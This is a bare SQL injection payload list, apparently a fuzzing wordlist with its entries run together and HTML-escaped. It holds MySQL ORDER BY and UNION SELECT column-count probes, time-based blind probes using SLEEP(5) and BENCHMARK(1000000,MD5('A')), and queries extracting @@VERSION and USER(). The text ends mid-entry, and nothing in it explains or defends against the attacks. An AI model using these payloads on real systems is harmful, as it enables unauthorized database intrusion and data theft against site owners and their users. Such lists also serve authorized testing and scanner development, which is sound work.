1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30ORDER BY SLEEP(5)#ORDER BY 1,SLEEP(5)#ORDER BY 1,SLEEP(5),3#ORDER BY 1,SLEEP(5),3,4#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#ORDER BY SLEEP(5)-- ORDER BY 1,SLEEP(5)-- ORDER BY 1,SLEEP(5),3-- ORDER BY 1,SLEEP(5),3,4-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 1UNION ALL SELECT 1,2UNION ALL SELECT 1,2,3UNION ALL SELECT 1,2,3,4UNION ALL SELECT 1,2,3,4,5UNION ALL SELECT 1,2,3,4,5,6UNION ALL SELECT 1,2,3,4,5,6,7UNION ALL SELECT 1,2,3,4,5,6,7,8UNION ALL SELECT 1,2,3,4,5,6,7,8,9UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION ALL SELECT 1#UNION ALL SELECT 1,2#UNION ALL SELECT 1,2,3#UNION ALL SELECT 1,2,3,4#UNION ALL SELECT 1,2,3,4,5#UNION ALL SELECT 1,2,3,4,5,6#UNION ALL SELECT 1,2,3,4,5,6,7#UNION ALL SELECT 1,2,3,4,5,6,7,8#UNION ALL SELECT 1,2,3,4,5,6,7,8,9#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#UNION ALL SELECT 1-- UNION ALL SELECT 1,2-- UNION ALL SELECT 1,2,3-- UNION ALL SELECT 1,2,3,4-- UNION ALL SELECT 1,2,3,4,5-- UNION ALL SELECT 1,2,3,4,5,6-- UNION ALL SELECT 1,2,3,4,5,6,7-- UNION ALL SELECT 1,2,3,4,5,6,7,8-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION SELECT @@VERSION,SLEEP(5),3UNION SELECT @@VERSION,SLEEP(5),USER(),4UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION SELECT @@VERSION,SLEEP(5),&quot;&#x27;3UNION SELECT @@VERSION,SLEEP(5),&quot;&#x27;3&#x27;&quot;#UNION SELECT @@VERSION,SLEEP(5),USER(),4#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#UNION ALL SELECT USER()-- UNION ALL SELECT SLEEP(5)-- UNION ALL SELECT USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;))-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#x27;A&#x27;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UNION ALL SELECT 